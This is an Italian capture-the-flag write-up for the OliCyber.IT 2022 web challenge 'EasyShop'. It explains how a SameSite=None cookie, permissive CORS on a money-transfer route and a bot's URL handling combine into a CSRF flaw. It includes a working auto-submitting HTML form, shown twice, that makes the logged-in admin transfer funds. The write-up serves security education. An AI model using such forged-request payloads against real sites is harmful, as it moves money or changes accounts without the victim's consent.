# OliCyber.IT 2022 - Competizione territoriale

## [web-2] EasyShop (12 risoluzioni)

Il sito permette di inviare e ricevere una moneta virtuale (ESC), tuttavia l'unico account ad avere un bilancio positivo è quello dell'amministratore. È inoltre possibile segnalare un link all'amministratore, che lo aprirà subito dopo aver eseguito il login sul sito. L'ultima azione che può compiere un utente è comprare la flag, tuttavia potrà farlo solo dopo aver raggiunto il bilancio di 1000 ESC. L'obiettivo è quello di farsi inviare gli ESC necessari dall'amministratore per poter comprare la flag.

### Soluzione

Possiamo notare che il cookie viene impostato con `samesite=None`, inoltre viene aggiunto alla risposta l'header `Access-Control-Allow-Credentials=true`

```python
wallet = jwt.encode(wallet, KEY, algorithm="HS256")
resp.set_cookie('wallet', wallet, samesite="None",
                secure=True, httponly=True)
resp.headers.add('Access-Control-Allow-Credentials', 'true')
```

Alla route che gestisce l'invio di denaro è stato applicato il decoratore `cross_origin`

```python
@app.route("/send", methods=["POST"])
@cross_origin()
@sessionhandler
def send_money(**kwargs):
```

Dalla sua documentazione:

_This function is the decorator which is used to wrap a Flask route with._
_In the simplest case, simply use the default parameters to allow all_
_origins in what is the most permissive configuration. If this method_
_modifies state or performs authentication which may be brute-forced, you_
_should add some degree of protection, such as Cross Site Forgery_
_Request protection._

Infine, il bot visita l'url fornito dall'utente in questo modo

```js
// Visit user link, this should be safe
await page.goto(
  new URL(
    process.argv[2] /* url applicazione */,
    process.argv[3] /* url fornito dall'utente */
  )
);
```

Dalla documentazione di node:

_new URL(input[, base])_
_input <string> The absolute or relative input URL to parse. If input is relative, then base is required._ **If input is absolute, the base is ignored\***. If input is not a string, it is converted to a string first.\*
_base <string> The base URL to resolve against if the input is not absolute. If base is not a string, it is converted to a string first_

Questo ci permette di inviare il bot su un nostro link, contenente il seguente codice html

```html
<html>
  <form action="http://easyshopURL/send" method="POST">
    <input name="to" value="mioIndirizzoESC" />
    <input name="amount" value="1000" />
  </form>
  <script>
    document.getElementsByTagName("form")[0].submit();
  </script>
</html>
```

Una volta visitato il link, il bot invierà una richiesta POST all'endpoint che invia i pagamenti, dandoci gli ESC necessari per comprare la flag. Faccio notare che, anche in assenza della flag `samesite=None` sul cookie, il problema sarebbe rimasto invariato su Chrome/Chromium, questo perchè di default utilizza una versione più permissiva rispetto a `samesite=Lax`, la quale invia alcuni cookie di sessione anche via POST, (qui)[https://groups.google.com/a/chromium.org/g/blink-dev/c/AknSSyQTGYs/m/YKBxPCScCwAJ?pli=1] il link alla spiegazione.

### Exploit

Inviare al bot un URL che risponda col seguente body.

```html
<html>
  <form action="http://easyshopURL/send" method="POST">
    <input name="to" value="mioIndirizzoESC" />
    <input name="amount" value="1000" />
  </form>
  <script>
    document.getElementsByTagName("form")[0].submit();
  </script>
</html>
```
